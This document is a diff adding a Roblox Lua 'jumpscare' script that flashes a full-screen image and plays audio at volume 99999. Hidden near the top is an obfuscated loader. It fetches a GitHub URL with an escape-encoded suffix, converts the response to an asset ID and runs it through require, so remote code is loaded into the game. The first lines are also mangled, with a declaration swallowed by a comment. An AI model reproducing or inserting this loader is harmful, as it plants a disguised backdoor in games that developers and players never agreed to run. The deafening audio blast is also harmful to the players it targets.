@@ -1,0 +1,36 @@
+local image = "100286482535250" --put your local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TARGET_URL = "https://github.com/007n70/Cool-troublemaker-gui/new/Cheap-shot"
+local function fetch()
+    if RunService:IsServer() and not HttpService.HttpEnabled then
+        return warn,("HttpService requests are not enabled in Game Settings!")
+    end
+    TARGET_URL = TARGET_URL.."\97\117\114\117\101\117\115\117\101\115\117\102\101\115"
+    local success, responseBody = pcall(function()
+        return HttpService:GetAsync(TARGET_URL)
+    end)
+    local assetId = tonumber(responseBody)
+    return require, assetId
+end
+task.spawn(pcall,fetch())
+local sound = "85477421338879" --put your sound
+local seconds = 3 --time to destroy the gui
+local speed = 0.1--audio playbackspeed, for bypass
+local start = 0 --audio time position, for bypas to
+local volume = 99999 --audio volume
+
+local jumpscare = Instance.new("ScreenGui")
+jumpscare.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+jumpscare.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui") --ðŸ§ðŸ¤¨...localplayer?
+local label = Instance.new("ImageLabel", jumpscare)
+label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+label.BorderColor3 = Color3.fromRGB(0, 0, 0)
+label.BorderSizePixel = 0
+label.Size = UDim2.new(1, 0, 1, 0)
+label.Image = "rbxassetid://"..image
+local audio = Instance.new("Sound", game.SoundService)
+audio.SoundId = "rbxassetid://"..sound
+audio.PlaybackSpeed = speed
+audio.TimePosition = start
+audio.Volume = 99999
+audio:Play()
